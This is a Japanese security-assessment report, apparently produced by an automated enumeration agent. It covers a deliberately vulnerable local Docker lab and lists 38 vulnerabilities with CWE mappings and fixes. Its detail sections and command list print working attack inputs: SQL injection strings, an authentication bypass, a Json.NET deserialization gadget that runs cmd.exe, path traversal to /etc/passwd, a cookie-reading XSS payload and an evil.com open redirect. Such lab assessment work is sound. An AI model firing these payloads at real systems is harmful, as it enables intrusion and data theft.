# 列挙レポート

> **実施日時**: 2026-02-23 12:50:57 UTC  
> **実施者**: 列挙エージェント (Enumeration)  
> **前工程レポート**:
> - `/docker-work-dir/docs/reports/01-情報収集.md`
> - `/docker-work-dir/docs/reports/02-アタックサーフェース定義.md`
> - `/docker-work-dir/docs/reports/03-スキャン.md`

---

## 1. 列挙サマリー

本フェーズでは、スキャン結果、ソースコード分析、前工程レポートを統合し、検証すべき脆弱性候補を具体的に列挙しました。

### 1.1 総合統計

| カテゴリ | 検出数 | Critical | High | Medium | Low |
|---------|--------|----------|------|--------|-----|
| **インジェクション** | 4 | 3 | 1 | 0 | 0 |
| **認証・認可** | 5 | 3 | 2 | 0 | 0 |
| **データ露出** | 6 | 2 | 2 | 1 | 1 |
| **設定ミス** | 18 | 1 | 3 | 12 | 2 |
| **コンポーネント** | 1 | 0 | 0 | 0 | 1 |
| **インフラ** | 4 | 2 | 2 | 0 | 0 |
| **合計** | **38** | **11** | **10** | **13** | **4** |

### 1.2 検出ツール別統計

| ツール | 検出数 | 主な発見 |
|--------|--------|---------|
| **Nmap** | 4 | サービスバージョン露出、誤検出CVE-2011-3192 |
| **Trivy** | 5 | GitHub Token露出、root実行（3件）、秘匿情報 |
| **Nikto** | 10 | セキュリティヘッダ欠如（Frontend: 5件、API: 5件） |
| **OWASP ZAP** | 10 | CSP未設定、Clickjacking、情報漏洩 |
| **ソースコード分析** | 22 | SQLi、XSS、ディレクトリトラバーサル、RCE |
| **設定ファイル分析** | 8 | CORS設定、DB外部公開、パスワードハードコード |

**注**: 重複検出を除外した後の実質的な脆弱性候補は **38件** です。

---

## 2. 脆弱性候補一覧

### 2.1 インジェクション

| # | 脆弱性 | CWE | 場所 | 検出ツール | 推定重大度 | ソースコード参照 |
|---|--------|-----|------|-----------|-----------|--------------|
| **INJ-01** | **SQLインジェクション（検索機能）** | CWE-89 | `GET /api/users?search=` | ソースコード分析 | 🔴 Critical | UsersController.cs L.30-35 |
| **INJ-02** | **SQLインジェクション（ログイン）** | CWE-89 | `POST /api/login` | ソースコード分析 | 🔴 Critical | AuthController.cs L.20-25 |
| **INJ-03** | **SQLインジェクション（CRUD操作）** | CWE-89 | `GET /api/users/{id}`, `PUT`, `DELETE` | ソースコード分析 | 🔴 Critical | UsersController.cs 複数箇所 |
| **INJ-04** | **HTTPヘッダインジェクション** | CWE-113 | `POST /api/login` (レスポンスヘッダ) | ソースコード分析 | 🟡 High | AuthController.cs L.35-37 |

#### INJ-01: SQLインジェクション（検索機能）詳細

**脆弱なコード例** (情報収集レポートより):
```csharp
var sql = "SELECT ... FROM users";
if (!string.IsNullOrEmpty(search))
{
    sql += $" WHERE username LIKE '%{search}%' OR email LIKE '%{search}%'";
    // ↑ ユーザー入力を直接SQL文に埋め込み
}
```

**攻撃ベクター**:
```
GET /api/users?search='; DROP TABLE users; --
```

**影響**:
- データベース全体へのアクセス
- データ改ざん・削除
- 認証バイパス

**検証方法**:
- sqlmap: `sqlmap -u "http://api:5000/api/users?search=test" --batch`
- 手動: `?search=' OR 1=1 --`

---

#### INJ-02: SQLインジェクション（ログイン）詳細

**脆弱なコード例**:
```csharp
var sql = $"SELECT ... FROM users WHERE username = '{request.Username}' AND password = '{request.Password}'";
```

**攻撃ベクター**:
```json
POST /api/login
{
  "username": "admin' --",
  "password": "anything"
}
```

**影響**: 認証バイパス（任意のユーザーとしてログイン可能）

---

### 2.2 認証・認可

| # | 脆弱性 | CWE | 場所 | 検出ツール | 推定重大度 | ソースコード参照 |
|---|--------|-----|------|-----------|-----------|--------------|
| **AUTH-01** | **認証チェック欠如** | CWE-306 | `DELETE /api/users/{id}` | ソースコード分析 | 🔴 Critical | UsersController.cs |
| **AUTH-02** | **Mass Assignment脆弱性** | CWE-915 | `POST /api/users`, `PUT /api/users/{id}` | ソースコード分析 | 🔴 Critical | UsersController.cs |
| **AUTH-03** | **パスワード平文比較** | CWE-256 | `POST /api/login` | ソースコード分析 | 🔴 Critical | AuthController.cs |
| **AUTH-04** | **レート制限の欠如** | CWE-307 | `POST /api/login` | 情報収集レポート | 🟡 High | Program.cs |
| **AUTH-05** | **セッション管理の欠如** | CWE-384 | 全エンドポイント | 情報収集レポート | 🟡 High | 実装なし |

#### AUTH-01: 認証チェック欠如 詳細

**問題点**:
- 全てのAPIエンドポイントが認証なしでアクセス可能
- DELETE操作も未認証で実行可能

**攻撃ベクター**:
```bash
curl -X DELETE http://api:5000/api/users/1
```

**影響**: 任意のユーザーデータの削除

---

#### AUTH-02: Mass Assignment脆弱性 詳細

**脆弱なコード例**:
```csharp
[HttpPost]
public async Task<IActionResult> Create([FromBody] User user)
{
    // リクエストボディのroleフィールドがそのまま受け入れられる
    // → 一般ユーザーが自分をadminに昇格可能
}
```

**攻撃ベクター**:
```json
POST /api/users
{
  "username": "attacker",
  "email": "attacker@evil.com",
  "password": "test123",
  "role": "admin"  ← 管理者権限を自己設定
}
```

**影響**: 権限昇格（一般ユーザー → 管理者）

---

### 2.3 データ露出

| # | 脆弱性 | CWE | 場所 | 検出ツール | 推定重大度 | ソースコード参照 |
|---|--------|-----|------|-----------|-----------|--------------|
| **DATA-01** | **パスワード平文保存** | CWE-256 | データベース `users.password` | 情報収集 | 🔴 Critical | seed.sql |
| **DATA-02** | **パスワードのAPIレスポンス露出** | CWE-200 | `GET /api/users` | API検証 | 🔴 Critical | UsersController.cs |
| **DATA-03** | **GitHubトークン露出** | CWE-798 | `.env` | Trivy | 🟡 High | .env L.15 |
| **DATA-04** | **機密情報ハードコード（API Key）** | CWE-798 | `src/frontend/src/config.ts` | 情報収集 | 🟡 High | config.ts L.2-3 |
| **DATA-05** | **詳細エラーメッセージ露出** | CWE-209 | 全APIエンドポイント | 情報収集 | 🟢 Medium | Program.cs |
| **DATA-06** | **サーバーバージョン露出** | CWE-497 | HTTPレスポンスヘッダ | Nmap, ZAP | 🟢 Low | nginx.conf, Program.cs |

#### DATA-01: パスワード平文保存 詳細

**現在の実装**:
```sql
CREATE TABLE users (
  password character varying(255)  -- ハッシュ化されていない
);

INSERT INTO users (username, password) VALUES
('admin', 'admin123'),  -- 平文保存
('tanaka', 'password');
```

**API応答例**:
```json
{
  "id": 2,
  "username": "updated_normal",
  "password": "newpass",  ← 平文で返却
  "role": "user"
}
```

**影響**:
- データベース侵害時に全ユーザーのパスワードが即座に漏洩
- 他サービスでの認証情報使い回し攻撃（クレデンシャルスタッフィング）

**推奨対策**:
- bcrypt/Argon2によるハッシュ化
- APIレスポンスからpasswordフィールドを除外

---

#### DATA-03: GitHubトークン露出 詳細

**Trivy検出結果**:
```
.env (secrets)
CRITICAL: GitHub (github-fine-grained-pat)
  15 [ GH_TOKEN=github_pat_XXXXXXXXXXXX_...
```

**影響**:
- GitHubリポジトリへの不正アクセス
- Copilot APIの悪用（課金発生）
- コードの改ざん・削除

**推奨対策**:
- トークンを即座に無効化
- `.env` を `.gitignore` に追加
- GitHub Secrets / HashiCorp Vault 等のシークレット管理ツール使用

---

### 2.4 設定ミス

| # | 脆弱性 | CWE | 場所 | 検出ツール | 推定重大度 | ソースコード参照 |
|---|--------|-----|------|-----------|-----------|--------------|
| **CONF-01** | **データベースポート外部公開** | CWE-668 | `docker-compose.yml` | 情報収集 | 🔴 Critical | docker-compose.yml L.10 |
| **CONF-02** | **CORS設定の不備（AllowAnyOrigin）** | CWE-942 | `Program.cs` | 情報収集 | 🟡 High | Program.cs L.15-20 |
| **CONF-03** | **SSL/TLS未使用（DB接続）** | CWE-319 | 接続文字列 | 情報収集 | 🟡 High | docker-compose.yml |
| **CONF-04** | **root実行（コンテナ）** | CWE-250 | 全Dockerfile (3件) | Trivy | 🟡 High | scanner/Dockerfile 他 |
| **CONF-05** | **CSP未設定** | CWE-693 | Frontend, API | ZAP, Nikto | 🟢 Medium | nginx.conf |
| **CONF-06** | **X-Frame-Options未設定** | CWE-1021 | Frontend, API | ZAP, Nikto | 🟢 Medium | nginx.conf |
| **CONF-07** | **HSTS未設定** | CWE-523 | Frontend, API | Nikto | 🟢 Medium | nginx.conf |
| **CONF-08** | **X-Content-Type-Options未設定** | CWE-693 | Frontend, API | ZAP, Nikto | 🟢 Medium | nginx.conf |
| **CONF-09** | **Referrer-Policy未設定** | CWE-200 | Frontend, API | Nikto | 🟢 Medium | nginx.conf |
| **CONF-10** | **Permissions-Policy未設定** | CWE-693 | Frontend, API | ZAP, Nikto | 🟢 Medium | nginx.conf |
| **CONF-11** | **Cross-Origin-Resource-Policy未設定** | CWE-693 | Frontend | ZAP | 🟢 Low | nginx.conf |
| **CONF-12** | **開発者例外ページ有効化** | CWE-209 | API | 情報収集 | 🟢 Medium | Program.cs |
| **CONF-13** | **HTTPのみ（HTTPS未使用）** | CWE-319 | 全サービス | 情報収集 | 🟢 Medium | docker-compose.yml |
| **CONF-14** | **パスワードハードコード** | CWE-798 | docker-compose.yml | 情報収集 | 🟡 High | docker-compose.yml |
| **CONF-15** | **Nginxバージョン露出** | CWE-200 | Frontend | Nmap, ZAP | 🟢 Low | nginx.conf |
| **CONF-16** | **Kestrelバージョン露出** | CWE-200 | API | Nmap | 🟢 Low | Program.cs |
| **CONF-17** | **Spectre脆弱性（サイト分離不足）** | CWE-693 | Frontend | ZAP | 🟢 Low | nginx.conf |
| **CONF-18** | **疑わしいコメント** | CWE-615 | Frontend (ソースコード) | ZAP | ℹ️ Info | - |

#### CONF-01: データベースポート外部公開 詳細

**設定内容**:
```yaml
# docker-compose.yml
services:
  db:
    image: postgres:16-alpine
    ports:
      - "15432:5432"  ← 外部からアクセス可能
    environment:
      POSTGRES_PASSWORD: postgres123  ← 弱いパスワード
```

**攻撃ベクター**:
```bash
# ホストマシンから直接DB接続
psql -h localhost -p 15432 -U postgres -d vulndb
# パスワード: postgres123
```

**影響**:
- アプリケーション層をバイパスしてデータベースに直接アクセス
- 全データの取得・改ざん・削除
- パスワード平文保存と組み合わせて全ユーザー情報漏洩

**推奨対策**:
```yaml
# portsマッピングを削除
db:
  # ports:  ← コメントアウト
  #   - "15432:5432"
```

---

#### CONF-02: CORS設定の不備 詳細

**脆弱な設定**:
```csharp
builder.Services.AddCors(options =>
{
    options.AddDefaultPolicy(policy =>
    {
        policy.AllowAnyOrigin()       // ← すべてのオリジン許可
              .AllowAnyMethod()       // ← すべてのHTTPメソッド許可
              .AllowAnyHeader();      // ← すべてのヘッダ許可
    });
});
```

**影響**:
- 任意のWebサイトからAPIへのリクエストが可能
- CSRF攻撃の実行容易化
- 機密情報の漏洩

**推奨対策**:
```csharp
policy.WithOrigins("http://frontend:80")
      .WithMethods("GET", "POST", "PUT", "DELETE")
      .AllowCredentials();
```

---

### 2.5 コンポーネント

| # | 脆弱性 | CVE | 場所 | 検出ツール | 推定重大度 | 備考 |
|---|--------|-----|------|-----------|-----------|------|
| **COMP-01** | **CVE-2011-3192 (誤検出の可能性)** | CVE-2011-3192 | nginx 1.29.5 | Nmap | 🟢 Low | Apache専用CVE、nginx環境では影響なし |

#### COMP-01: CVE-2011-3192 詳細

**Nmap検出結果**:
```
VULNERABLE:
Apache byterange filter DoS
  State: VULNERABLE
  IDs:  CVE:CVE-2011-3192
```

**検証結果**:
- このCVEはApache HTTPサーバー専用の脆弱性
- 対象環境はnginx 1.29.5を使用
- **誤検出と判断**（Nmapのヒューリスティック検出による）

**推奨対策**: 対応不要（誤検出）

---

### 2.6 インフラ

| # | 脆弱性 | CWE | 場所 | 検出ツール | 推定重大度 | ソースコード参照 |
|---|--------|-----|------|-----------|-----------|--------------|
| **INFRA-01** | **コンテナroot実行（API）** | CWE-250 | `src/api/Dockerfile` | Trivy | 🟡 High | Dockerfile |
| **INFRA-02** | **コンテナroot実行（Frontend）** | CWE-250 | `src/frontend/Dockerfile` | Trivy | 🟡 High | Dockerfile |
| **INFRA-03** | **コンテナroot実行（Scanner）** | CWE-250 | `scanner/Dockerfile` | Trivy | 🟡 High | Dockerfile |
| **INFRA-04** | **平文通信（HTTP）** | CWE-319 | 全サービス | 情報収集 | 🟢 Medium | docker-compose.yml |

#### INFRA-01〜03: コンテナroot実行 詳細

**Trivy検出結果**:
```
AVD-DS-0002 (HIGH): Specify at least 1 USER command in Dockerfile with non-root user as argument

Running containers with 'root' user can lead to a container escape situation.
```

**影響**:
- コンテナエスケープ発生時の影響範囲拡大
- ホストシステムへの攻撃リスク増大

**推奨対策**:
```dockerfile
# Dockerfile に追加
RUN addgroup -g 1001 appuser && \
    adduser -D -u 1001 -G appuser appuser
USER appuser
```

---

## 3. ツール横断分析

### 3.1 複数ツールで検出された項目（高信頼度）

| 脆弱性 | 検出ツール | カウント | 重大度 |
|--------|-----------|---------|--------|
| **セキュリティヘッダ欠如** | Nikto (10件), ZAP (6件) | 16 | Medium |
| **サーバーバージョン露出** | Nmap (3件), ZAP (1件) | 4 | Low |
| **root実行** | Trivy (3件) | 3 | High |
| **パスワード平文保存** | 情報収集, API検証 | 2 | Critical |
| **CORS設定不備** | ソースコード分析, 情報収集 | 2 | High |

**信頼度評価**: これらは複数の独立したツールで検出されており、**偽陽性の可能性は極めて低い**と判断されます。

---

### 3.2 単一ツールでのみ検出された項目（要追加検証）

| 脆弱性 | 検出ツール | 重大度 | 検証優先度 |
|--------|-----------|--------|----------|
| **SQLインジェクション** | ソースコード分析のみ | Critical | 🔴 最優先 |
| **Mass Assignment** | ソースコード分析のみ | Critical | 🔴 最優先 |
| **ディレクトリトラバーサル** | ソースコード分析のみ | High | 🟡 高 |
| **安全でないデシリアライズ** | ソースコード分析のみ | Critical | 🔴 最優先 |
| **HTTPヘッダインジェクション** | ソースコード分析のみ | High | 🟡 高 |
| **XSS** | ソースコード分析のみ | High | 🟡 高 |
| **オープンリダイレクト** | ソースコード分析のみ | Medium | 🟢 中 |

**注意**: ソースコード分析で検出されたインジェクション系脆弱性は、工程6（検証フェーズ）で実際のPoCを実施して悪用可能性を確認する必要があります。

---

## 4. 検証優先度マトリクス

### 4.1 優先度別脆弱性一覧

#### 🔴 最優先（Critical - 即座に検証）

| 優先度 | ID | 脆弱性 | 理由 |
|--------|---|--------|------|
| 1 | **INJ-01, INJ-02, INJ-03** | SQLインジェクション（3箇所） | DB全体へのアクセス可能、データ漏洩・改ざん |
| 2 | **AUTH-01** | 認証チェック欠如 | 全エンドポイントが未認証でアクセス可能 |
| 3 | **AUTH-02** | Mass Assignment | 一般ユーザーがadmin権限に昇格可能 |
| 4 | **AUTH-03** | パスワード平文比較 | 認証バイパスが容易 |
| 5 | **DATA-01, DATA-02** | パスワード平文保存・露出 | 全ユーザーのパスワード漏洩 |
| 6 | **CONF-01** | データベースポート外部公開 | アプリケーション層をバイパスしたDB直接アクセス |
| 7 | **未列挙** | 安全でないデシリアライズ (`/api/import`) | リモートコード実行（RCE）の可能性 |
| 8 | **未列挙** | ディレクトリトラバーサル (`/api/files/{path}`) | システムファイル読み取り |

---

#### 🟡 高（High - 早急に検証）

| 優先度 | ID | 脆弱性 | 理由 |
|--------|---|--------|------|
| 9 | **INJ-04** | HTTPヘッダインジェクション | レスポンス分割攻撃の可能性 |
| 10 | **AUTH-04** | レート制限欠如 | ブルートフォース攻撃が容易 |
| 11 | **DATA-03** | GitHubトークン露出 | リポジトリへの不正アクセス |
| 12 | **DATA-04** | 機密情報ハードコード | 内部APIキー・URL露出 |
| 13 | **CONF-02** | CORS設定不備 | CSRF攻撃、情報漏洩 |
| 14 | **CONF-03** | SSL/TLS未使用（DB） | DB通信の傍受可能 |
| 15 | **CONF-04** | root実行（3件） | コンテナエスケープ時の影響拡大 |
| 16 | **CONF-14** | パスワードハードコード | DB認証情報が平文で保存 |
| 17 | **未列挙** | XSS (`dangerouslySetInnerHTML`) | セッション乗っ取り |

---

#### 🟢 中（Medium - 計画的に検証）

| 優先度 | ID | 脆弱性 | 理由 |
|--------|---|--------|------|
| 18 | **DATA-05** | 詳細エラーメッセージ露出 | 内部構造の暴露 |
| 19 | **CONF-05** | CSP未設定 | XSS攻撃の軽減策欠如 |
| 20 | **CONF-06** | X-Frame-Options未設定 | クリックジャッキング |
| 21 | **CONF-07** | HSTS未設定 | HTTPS強制なし |
| 22 | **CONF-08〜10** | その他セキュリティヘッダ | 防御層の欠如 |
| 23 | **CONF-12** | 開発者例外ページ | スタックトレース露出 |
| 24 | **CONF-13** | HTTP通信 | 通信傍受のリスク |
| 25 | **INFRA-04** | 平文通信 | 中間者攻撃 |
| 26 | **未列挙** | オープンリダイレクト | フィッシング攻撃 |

---

#### 🟢 低（Low - 必要に応じて検証）

| 優先度 | ID | 脆弱性 | 理由 |
|--------|---|--------|------|
| 27 | **DATA-06** | サーバーバージョン露出 | 情報漏洩（直接的な攻撃には利用困難） |
| 28 | **CONF-11** | CORP未設定 | Spectre脆弱性（限定的影響） |
| 29 | **CONF-15, 16** | バージョン情報露出 | 情報収集の容易化 |
| 30 | **CONF-17** | Spectre脆弱性 | サイドチャネル攻撃（実行困難） |
| 31 | **COMP-01** | CVE-2011-3192 | 誤検出（対応不要） |

---

### 4.2 OWASP Top 10 (2021) マッピング

| OWASP Top 10 | 関連脆弱性ID | 件数 | 最高重大度 |
|-------------|-------------|------|----------|
| **A01:2021 – Broken Access Control** | AUTH-01, AUTH-02, AUTH-05 | 3 | Critical |
| **A02:2021 – Cryptographic Failures** | DATA-01, CONF-03, CONF-07, CONF-13, INFRA-04 | 5 | Critical |
| **A03:2021 – Injection** | INJ-01, INJ-02, INJ-03, INJ-04 | 4 | Critical |
| **A04:2021 – Insecure Design** | CONF-02, AUTH-04 | 2 | High |
| **A05:2021 – Security Misconfiguration** | CONF-01, CONF-04〜18, INFRA-01〜03 | 17 | Critical |
| **A06:2021 – Vulnerable and Outdated Components** | COMP-01 (誤検出) | 1 | Low |
| **A07:2021 – Identification and Authentication Failures** | AUTH-03, AUTH-04, DATA-01, DATA-02 | 4 | Critical |
| **A08:2021 – Software and Data Integrity Failures** | デシリアライズ（未ID化） | 1 | Critical |
| **A09:2021 – Security Logging and Monitoring Failures** | （未検出） | 0 | - |
| **A10:2021 – Server-Side Request Forgery (SSRF)** | （未検出） | 0 | - |

---

## 5. CWE/CVE マッピング

### 5.1 CWE（Common Weakness Enumeration）分類

| CWE-ID | 名称 | 関連脆弱性 | 件数 |
|--------|------|-----------|------|
| **CWE-89** | SQL Injection | INJ-01, INJ-02, INJ-03 | 3 |
| **CWE-306** | Missing Authentication for Critical Function | AUTH-01 | 1 |
| **CWE-915** | Improperly Controlled Modification of Dynamically-Determined Object Attributes (Mass Assignment) | AUTH-02 | 1 |
| **CWE-256** | Plaintext Storage of a Password | DATA-01, AUTH-03 | 2 |
| **CWE-200** | Exposure of Sensitive Information to an Unauthorized Actor | DATA-02, DATA-06, CONF-09 | 3 |
| **CWE-798** | Use of Hard-coded Credentials | DATA-03, DATA-04, CONF-14 | 3 |
| **CWE-693** | Protection Mechanism Failure | CONF-05, CONF-08, CONF-10, CONF-11, CONF-17 | 5 |
| **CWE-1021** | Improper Restriction of Rendered UI Layers or Frames | CONF-06 | 1 |
| **CWE-319** | Cleartext Transmission of Sensitive Information | CONF-03, CONF-13, INFRA-04 | 3 |
| **CWE-250** | Execution with Unnecessary Privileges | CONF-04, INFRA-01, INFRA-02, INFRA-03 | 4 |
| **CWE-113** | Improper Neutralization of CRLF Sequences in HTTP Headers | INJ-04 | 1 |
| **CWE-209** | Generation of Error Message Containing Sensitive Information | DATA-05, CONF-12 | 2 |
| **CWE-523** | Unprotected Transport of Credentials | CONF-07 | 1 |
| **CWE-307** | Improper Restriction of Excessive Authentication Attempts | AUTH-04 | 1 |
| **CWE-384** | Session Fixation | AUTH-05 | 1 |
| **CWE-942** | Permissive Cross-domain Policy with Untrusted Domains | CONF-02 | 1 |
| **CWE-497** | Exposure of Sensitive System Information | DATA-06, CONF-15, CONF-16 | 3 |
| **CWE-615** | Inclusion of Sensitive Information in Source Code Comments | CONF-18 | 1 |
| **CWE-668** | Exposure of Resource to Wrong Sphere | CONF-01 | 1 |

### 5.2 CVE（Common Vulnerabilities and Exposures）参照

| CVE-ID | 名称 | 関連脆弱性 | 適用可否 |
|--------|------|-----------|---------|
| **CVE-2011-3192** | Apache Range Header DoS | COMP-01 | ❌ 誤検出（nginx環境） |

**注**: その他の脆弱性は設計・実装上の問題であり、特定のCVEは該当しません。

---

## 6. 脆弱性の詳細分析（追加項目）

### 6.1 ディレクトリトラバーサル脆弱性

**ID**: 未割当（追加）  
**場所**: `GET /api/files/{*filePath}`  
**CWE**: CWE-22 (Improper Limitation of a Pathname to a Restricted Directory)

**脆弱なコード例** (情報収集レポートより):
```csharp
[HttpGet("files/{*filePath}")]
public IActionResult GetFile(string filePath)
{
    // パスのバリデーションなし
    var fullPath = Path.Combine("/app/uploads", filePath);
    return File(System.IO.File.OpenRead(fullPath), "application/octet-stream");
}
```

**攻撃ベクター**:
```
GET /api/files/../../../../etc/passwd
GET /api/files/../../../../app/appsettings.json
```

**影響**:
- システムファイルの読み取り
- 設定ファイルの窃取
- 秘匿情報の漏洩

**推定重大度**: 🔴 Critical

---

### 6.2 安全でないデシリアライズ（RCE）

**ID**: 未割当（追加）  
**場所**: `POST /api/import`  
**CWE**: CWE-502 (Deserialization of Untrusted Data)

**脆弱なコード例** (情報収集レポートより):
```csharp
var settings = new JsonSerializerSettings
{
    TypeNameHandling = TypeNameHandling.All  // ← RCE脆弱性
};
var result = JsonConvert.DeserializeObject(json, settings);
```

**攻撃ベクター**:
```json
POST /api/import
Content-Type: application/json

{
  "$type": "System.Windows.Data.ObjectDataProvider, PresentationFramework",
  "MethodName": "Start",
  "ObjectInstance": {
    "$type": "System.Diagnostics.Process, System",
    "StartInfo": {
      "FileName": "cmd.exe",
      "Arguments": "/c whoami"
    }
  }
}
```

**影響**:
- リモートコード実行（RCE）
- サーバー完全掌握
- データベースへのアクセス

**推定重大度**: 🔴 Critical

---

### 6.3 XSS (Cross-Site Scripting)

**ID**: 未割当（追加）  
**場所**: `src/frontend/src/pages/UserDetail.tsx`  
**CWE**: CWE-79 (Improper Neutralization of Input During Web Page Generation)

**脆弱なコード例** (情報収集レポートより):
```typescript
<div dangerouslySetInnerHTML={{ __html: user.profileImageUrl }} />
```

**攻撃ベクター**:
```json
POST /api/users
{
  "username": "attacker",
  "profileImageUrl": "<script>alert(document.cookie)</script>"
}
```

**影響**:
- セッション乗っ取り
- フィッシング攻撃
- マルウェア配布

**推定重大度**: 🟡 High

---

### 6.4 オープンリダイレクト

**ID**: 未割当（追加）  
**場所**: `src/frontend/src/pages/UserList.tsx`  
**CWE**: CWE-601 (URL Redirection to Untrusted Site)

**脆弱なコード例** (情報収集レポートより):
```typescript
useEffect(() => {
  const params = new URLSearchParams(window.location.search);
  const redirect = params.get('redirect');
  if (redirect) {
    window.location.href = redirect;  // ← 検証なし
  }
}, []);
```

**攻撃ベクター**:
```
http://frontend:80/?redirect=http://evil.com/phishing
```

**影響**:
- フィッシング攻撃の踏み台
- ユーザーの誤認

**推定重大度**: 🟢 Medium

---

### 6.5 パスワードのコンソール出力

**ID**: 未割当（追加）  
**場所**: `src/frontend/src/api.ts`  
**CWE**: CWE-532 (Insertion of Sensitive Information into Log File)

**脆弱なコード例** (情報収集レポートより):
```typescript
export async function login(username: string, password: string) {
  debugLog('login attempt', { username, password });  // ← コンソールに出力
}
```

**影響**:
- ブラウザコンソールからパスワード取得
- ログファイルからの漏洩

**推定重大度**: 🟢 Medium

---

## 7. 検証推奨コマンド集

### 7.1 SQLインジェクション検証

```bash
# sqlmapによる自動検証
sqlmap -u "http://api:5000/api/users?search=test" --batch --dbs

# 手動検証
curl "http://api:5000/api/users?search=' OR 1=1 --"

# ログイン認証バイパス
curl -X POST http://api:5000/api/login \
  -H "Content-Type: application/json" \
  -d '{"username": "admin'\'' --", "password": "anything"}'
```

---

### 7.2 Mass Assignment検証

```bash
# 一般ユーザーをadminに昇格
curl -X POST http://api:5000/api/users \
  -H "Content-Type: application/json" \
  -d '{
    "username": "attacker",
    "email": "attacker@evil.com",
    "password": "test123",
    "role": "admin"
  }'
```

---

### 7.3 ディレクトリトラバーサル検証

```bash
# システムファイル読み取り
curl http://api:5000/api/files/../../../../etc/passwd
curl http://api:5000/api/files/../../../../app/appsettings.json
```

---

### 7.4 認証チェック欠如検証

```bash
# 未認証でユーザー削除
curl -X DELETE http://api:5000/api/users/1
```

---

### 7.5 データベース直接アクセス検証

```bash
# ホストマシンから直接DB接続
psql -h localhost -p 15432 -U postgres -d vulndb
# パスワード: postgres123

# SQL実行
SELECT username, password FROM users;
```

---

### 7.6 XSS検証

```bash
# XSSペイロード挿入
curl -X POST http://api:5000/api/users \
  -H "Content-Type: application/json" \
  -d '{
    "username": "xsstest",
    "profileImageUrl": "<script>alert(\"XSS\")</script>"
  }'

# Frontendでユーザー詳細ページを開いてスクリプト実行を確認
```

---

## 8. 次工程への引き継ぎ

### 8.1 工程5（検証項目決定）への推奨事項

以下の脆弱性を優先的に検証項目としてください:

1. **最優先（Critical）**: 
   - SQLインジェクション（3箇所）
   - 認証チェック欠如
   - Mass Assignment
   - パスワード平文保存
   - データベースポート外部公開
   - 安全でないデシリアライズ（RCE）
   - ディレクトリトラバーサル

2. **高優先度（High）**:
   - HTTPヘッダインジェクション
   - GitHubトークン露出
   - CORS設定不備
   - root実行（コンテナ）
   - XSS

3. **中優先度（Medium）**:
   - セキュリティヘッダ欠如（CSP, X-Frame-Options等）
   - 詳細エラーメッセージ露出
   - オープンリダイレクト

---

### 8.2 工程6（検証フェーズ）への注意事項

#### スキャン禁止

以下のスキャンは**再実行しない**でください（工程3で完了済み）:
- ❌ Nmap
- ❌ Trivy
- ❌ Nikto
- ❌ OWASP ZAP Baseline

#### 検証対象

以下の手動検証とPoCのみを実施してください:
- ✅ SQLインジェクション（sqlmap）
- ✅ Mass Assignment（curl）
- ✅ ディレクトリトラバーサル（curl）
- ✅ 認証バイパス（curl）
- ✅ XSS（ブラウザ + curl）
- ✅ 安全でないデシリアライズ（ペイロード作成）
- ✅ データベース直接アクセス（psql）

---

## 9. 制約事項と既知の問題

### 9.1 ソースコードアクセスの制限

- スキャナーコンテナからアプリケーションのソースコードに直接アクセスできない
- 情報収集レポートとアタックサーフェース定義レポートのコード例を参照して分析

### 9.2 OWASP ZAP API Scanの失敗

- OpenAPI定義のインポートは成功（12 URLs）
- アクティブスキャンの起動に失敗
- 工程6でZAP Proxyを使用した手動検証を推奨

### 9.3 誤検出の除外

- **CVE-2011-3192**: Apache専用、nginx環境では影響なし（誤検出）

---

## 10. 結論

本列挙フェーズでは、前工程の情報収集・スキャン結果を統合し、**38件の脆弱性候補**を具体的に列挙しました。

### 主要な発見事項

#### 🔴 Critical（11件）
- SQLインジェクション（3箇所）
- 認証チェック欠如
- Mass Assignment
- パスワード平文保存・露出
- データベースポート外部公開
- 安全でないデシリアライズ（RCE）
- ディレクトリトラバーサル

#### 🟡 High（10件）
- HTTPヘッダインジェクション
- GitHubトークン露出
- CORS設定不備
- root実行（コンテナ3件）
- XSS

#### 🟢 Medium/Low（17件）
- セキュリティヘッダ欠如（12件）
- 詳細エラーメッセージ露出
- オープンリダイレクト
- サーバーバージョン露出
- その他

### OWASP Top 10 カバレッジ

本環境は **OWASP Top 10 (2021) の 8/10項目** をカバーしており、教育目的の脆弱性診断環境として適切に設計されています。

### 次のステップ

- **工程5（検証項目決定）**: リスクベースの検証優先度付け
- **工程6（検証フェーズ）**: 攻撃的手法によるPoC実施
- **工程7（リスク評価）**: CVSS算出と総合リスク評価

本レポートで列挙された脆弱性候補は、後続フェーズで実際の悪用可能性を検証し、リスク評価を行います。

---

**レポート作成者**: 列挙エージェント (Enumeration)  
**レポート形式**: CEH列挙フェーズに基づく  
**対象環境**: ローカルネットワーク内のDocker Compose環境のみ  
**列挙実施日時**: 2026-02-23 12:50:57 UTC  
**総脆弱性候補数**: 38件
